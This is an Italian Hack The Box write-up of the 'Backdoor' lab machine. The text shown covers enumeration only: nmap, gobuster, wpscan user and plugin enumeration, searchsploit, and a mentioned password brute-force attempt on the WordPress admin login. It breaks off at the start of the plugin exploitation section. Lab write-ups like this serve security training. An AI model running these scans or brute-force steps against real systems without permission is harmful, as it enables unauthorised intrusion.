<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2022-04-21 gio 09:43 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>HTB - Backdoor</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="Andrea Pepe" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .equation-container {
    display: table;
    text-align: center;
    width: 100%;
  }
  .equation {
    vertical-align: middle;
  }
  .equation-label {
    display: table-cell;
    text-align: right;
    vertical-align: middle;
  }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="http://thomasf.github.io/solarized-css/solarized-light.min.css" />

<script type="text/javascript" src="http://thomasf.github.io/solarized-css/org-info.min.js">
/**
 *
 * @source: http://thomasf.github.io/solarized-css/org-info.min.js
 *
 * @licstart  The following is the entire license notice for the
 *  JavaScript code in http://thomasf.github.io/solarized-css/org-info.min.js.
 *
 * Copyright (C) 2012-2020 Free Software Foundation, Inc.
 *
 *
 * The JavaScript code in this tag is free software: you can
 * redistribute it and/or modify it under the terms of the GNU
 * General Public License (GNU GPL) as published by the Free Software
 * Foundation, either version 3 of the License, or (at your option)
 * any later version.  The code is distributed WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
 *
 * As additional permission under GNU GPL version 3 section 7, you
 * may distribute non-source (e.g., minimized or compacted) forms of
 * that code without the copy of the GNU GPL normally required by
 * section 4, provided you include this license notice and a URL
 * through which recipients can access the Corresponding Source.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in http://thomasf.github.io/solarized-css/org-info.min.js.
 *
 */
</script>

<script type="text/javascript">

/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2020 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/

<!--/*--><![CDATA[/*><!--*/
org_html_manager.set("TOC_DEPTH", "3");
org_html_manager.set("LINK_HOME", "");
org_html_manager.set("LINK_UP", "");
org_html_manager.set("LOCAL_TOC", "1");
org_html_manager.set("VIEW_BUTTONS", "0");
org_html_manager.set("MOUSE_HINT", "underline");
org_html_manager.set("FIXED_TOC", "0");
org_html_manager.set("TOC", "1");
org_html_manager.set("VIEW", "1");
org_html_manager.setup();  // activate after the parameters are set
/*]]>*///-->
</script>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2020 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
</head>
<body>
<div id="content">
<h1 class="title">HTB - Backdoor</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orgcef660b">Enumeration</a>
<ul>
<li><a href="#org8bcbcef">nmap</a>
<ul>
<li><a href="#org2086765">nmap -sC -sV backdoor</a></li>
</ul>
</li>
<li><a href="#org4eb36f3">gobuster</a>
<ul>
<li><a href="#org672d7e0">dir enum</a></li>
<li><a href="#orge15e2e6">vhost enum</a></li>
</ul>
</li>
<li><a href="#org931a340">web server</a>
<ul>
<li><a href="#orga8a9f5b">wpscan</a></li>
<li><a href="#orgba24115">searchsploit</a></li>
<li><a href="#orgc3db691">Plugin exploitation</a></li>
<li><a href="#orgb16cf2a">LFI</a></li>
</ul>
</li>
<li><a href="#org2697696">gdbserver</a>
<ul>
<li><a href="#org74ae6e4">Exploit</a></li>
<li><a href="#org79c334a">gdb</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org00b2587">Privilege Escalation</a>
<ul>
<li><a href="#org1d75f35">user</a>
<ul>
<li><a href="#orgc1a388a">user flag</a></li>
<li><a href="#org5ce208a">mysql</a></li>
<li><a href="#org936a0f3">linpeas</a></li>
<li><a href="#org8ecc33c">exploit screen -x</a></li>
</ul>
</li>
<li><a href="#org65db2c7">root</a></li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-orgcef660b" class="outline-2">
<h2 id="orgcef660b">Enumeration</h2>
<div class="outline-text-2" id="text-orgcef660b">
</div>
<div id="outline-container-org8bcbcef" class="outline-3">
<h3 id="org8bcbcef">nmap</h3>
<div class="outline-text-3" id="text-org8bcbcef">
</div>
<div id="outline-container-org2086765" class="outline-4">
<h4 id="org2086765">nmap -sC -sV backdoor</h4>
<div class="outline-text-4" id="text-org2086765">
<pre class="example">
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-18 09:44 CEST
Nmap scan report for backdoor (10.10.11.125)
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &amp;#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.35 seconds
</pre>

<p>
Notiamo che c'è un web server sulla porta TCP/80 e che è stato generato con <code>Wordpress v 5.8.1</code>.
</p>
</div>
</div>
</div>

<div id="outline-container-org4eb36f3" class="outline-3">
<h3 id="org4eb36f3">gobuster</h3>
<div class="outline-text-3" id="text-org4eb36f3">
</div>
<div id="outline-container-org672d7e0" class="outline-4">
<h4 id="org672d7e0">dir enum</h4>
<div class="outline-text-4" id="text-org672d7e0">
<pre class="example">
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://backdoor
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://backdoor
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/18 09:52:42 Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 309] [--&gt; http://backdoor/wp-content/]
/wp-includes          (Status: 301) [Size: 310] [--&gt; http://backdoor/wp-includes/]
/wp-admin             (Status: 301) [Size: 307] [--&gt; http://backdoor/wp-admin/]   
Progress: 9990 / 220561 (4.53%) 
</pre>

<p>
Le uniche cose trovate sono relative a wordpress, non sembra nulla di exploitabile.
</p>
</div>
</div>
<div id="outline-container-orge15e2e6" class="outline-4">
<h4 id="orge15e2e6">vhost enum</h4>
<div class="outline-text-4" id="text-orge15e2e6">
<p>
Visitando il sito web, premendo su home si vede che il browser non riesce a fare il redirect
a <code>backdoor.htb</code> (poiché non è associato ad alcun indirizzo IP in <code>/etc/hosts</code>), quindi di certo 
c'è un <b><b>virtual host</b></b>, ma effettuaiamo una scansione per vedere se ce ne sono altri.
</p>

<pre class="example">
gobuster vhost -u http://backdoor -w ~/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 2&gt;/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://backdoor
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/andrea/Scrivania/gitFolder/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/18 10:05:48 Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.backdoor (Status: 200) [Size: 63830]
Found: ns1.backdoor (Status: 200) [Size: 63830]
Found: localhost.backdoor (Status: 200) [Size: 64004]
Found: smtp.backdoor (Status: 200) [Size: 63859]     
Found: ftp.backdoor (Status: 200) [Size: 63830]      
Found: cpanel.backdoor (Status: 200) [Size: 63917]   
Found: whm.backdoor (Status: 200) [Size: 63830]      
Found: webmail.backdoor (Status: 200) [Size: 63946]  
Found: pop.backdoor (Status: 200) [Size: 63830]      
Found: webdisk.backdoor (Status: 200) [Size: 63946]  
Found: mail.backdoor (Status: 200) [Size: 63859]     
Found: autoconfig.backdoor (Status: 200) [Size: 64033]
Found: ns2.backdoor (Status: 200) [Size: 63830]       
Found: test.backdoor (Status: 200) [Size: 63859]      
Found: dev.backdoor (Status: 200) [Size: 63830]       
Found: ns.backdoor (Status: 200) [Size: 63801]        
Found: blog.backdoor (Status: 200) [Size: 63859]      
Found: autodiscover.backdoor (Status: 200) [Size: 64091]
Found: m.backdoor (Status: 200) [Size: 63772]           
Found: mail2.backdoor (Status: 200) [Size: 63888]       
Found: admin.backdoor (Status: 200) [Size: 63888]       
Found: ns3.backdoor (Status: 200) [Size: 63830]         
Found: pop3.backdoor (Status: 200) [Size: 63859]        
Found: forum.backdoor (Status: 200) [Size: 63888]       
Found: www2.backdoor (Status: 200) [Size: 63859]        
Found: vpn.backdoor (Status: 200) [Size: 63830]         
Found: mx.backdoor (Status: 200) [Size: 63801]          
Found: imap.backdoor (Status: 200) [Size: 63859]        
Found: old.backdoor (Status: 200) [Size: 63830]         
Found: mysql.backdoor (Status: 200) [Size: 63888]       
Found: beta.backdoor (Status: 200) [Size: 63859]        
Found: support.backdoor (Status: 200) [Size: 63946]     
Found: new.backdoor (Status: 200) [Size: 63830]         
Found: mobile.backdoor (Status: 200) [Size: 63917]      
Found: secure.backdoor (Status: 200) [Size: 63917]      
Found: shop.backdoor (Status: 200) [Size: 63859]        
Found: cp.backdoor (Status: 200) [Size: 63801]          
Found: demo.backdoor (Status: 200) [Size: 63859]        
Found: dns2.backdoor (Status: 200) [Size: 63859]        
Found: ns4.backdoor (Status: 200) [Size: 63830]         
Found: dns1.backdoor (Status: 200) [Size: 63859]        
Found: static.backdoor (Status: 200) [Size: 63917]      
Found: lists.backdoor (Status: 200) [Size: 63888]       
Found: news.backdoor (Status: 200) [Size: 63859]        
Found: server.backdoor (Status: 200) [Size: 63917] 
</pre>

<p>
Purtroppo vengono individuati una marea di vhosts e quindi si decide di proseguire
con quelli che incontriamo chiaramente lungo il percorso, a partire da <code>backdoor.htb</code>.
</p>
</div>
</div>
</div>
<div id="outline-container-org931a340" class="outline-3">
<h3 id="org931a340">web server</h3>
<div class="outline-text-3" id="text-org931a340">
<p>
Il virtual host <code>backdoor.htb</code> sembra essere una copia esatta del sito precedente,
con l'eccezione che ha una pagina di home funzionante senza redirect.
Nella pagina relativa al <code>blog</code> si nota un commento di un utente <b><b>admin</b></b>.
Il plugin per postare i commenti nel blog è <code>Gravatar</code>, ma effettuando ricerche in 
rete non sembrano esserci informazioni interessanti.
</p>
</div>

<div id="outline-container-orga8a9f5b" class="outline-4">
<h4 id="orga8a9f5b">wpscan</h4>
<div class="outline-text-4" id="text-orga8a9f5b">
<pre class="example">
sudo wpscan --url http://backdoor.htb
[sudo] password di andrea: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Mon Apr 18 18:56:49 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
 |  - http://backdoor.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 &lt;===============&gt; (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 18 18:56:57 2022
[+] Requests Done: 187
[+] Cached Requests: 5
[+] Data Sent: 45.491 KB
[+] Data Received: 18.677 MB
[+] Memory used: 229.719 MB
[+] Elapsed time: 00:00:08

</pre>

<p>
Con <code>wpscan</code> (essendo il sito web realizzato con Wordpress), si tenta di estrarre alcune informazioni.
</p>

<p>
Facendoci guidare dal nome della macchina, si cerca su internet qualche vulnerabilità di Wordpress relativa
ad una <code>backdoor</code> e una sorgente interessante è il contenuto del seguente <a href="https://pentaroot.com/exploit-wordpress-backdoor-theme-pages/">link.</a> 
</p>

<p>
Si trova la pagina di login di wordpress a: <code>http://backdoor.htb/wp-login.php</code> e tentiamo di fare <b><b>brute-force</b></b>
della password con username <b><b>admin</b></b> usando <code>wpscan</code>.
</p>

<p>
Tuttavia, l'exploit sembra non funzionare.
</p>
</div>
</div>
<div id="outline-container-orgba24115" class="outline-4">
<h4 id="orgba24115">searchsploit</h4>
<div class="outline-text-4" id="text-orgba24115">
<pre class="example">
searchsploit WordPress 5.8.1          
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txt
WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection           | php/webapps/44943.txt
WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection         | php/webapps/48918.sh
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</pre>

<p>
La maggior parte delle informazioni legate in rete, per quanto riguarda vulnerabilità di wordpress
che includano lo sfruttamento di una backdoor sono legate all'uso di <b><b>plugins</b></b>.
</p>

<p>
Cerchimo quindi di usare ancora <code>wpscan</code> per cercare i plugin utilizzati:
</p>
<pre class="example">
sudo wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive         3 ⨯
[sudo] password di andrea: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://backdoor.htb/ [10.10.11.125]
[+] Started: Mon Apr 18 20:02:31 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
 |  - http://backdoor.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-01-25T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Most Popular Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:46 &lt;====================&gt; (1500 / 1500) 100.00% Time: 00:00:46
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;========================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://backdoor.htb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Apr 18 20:03:26 2022
[+] Requests Done: 1557
[+] Cached Requests: 8
[+] Data Sent: 426.63 KB
[+] Data Received: 779.333 KB
[+] Memory used: 230.309 MB
[+] Elapsed time: 00:00:54
</pre>

<p>
Notiamo che viene rilevato il plugin <code>akismet</code>. Cerchiamo informazioni in rete.
</p>
</div>
</div>
<div id="outline-container-orgc3db691" class="outline-4">
<h4 id="orgc3db691">Plugin exploitation</h4>
<div class="outline-text-4" id="text-orgc3db691">
<p>
Andando in <code>http://backdoor.htb/wp-content/plugins/akismet</code>, ci viene detto che non abbiamo i permessi per quella risorsa.
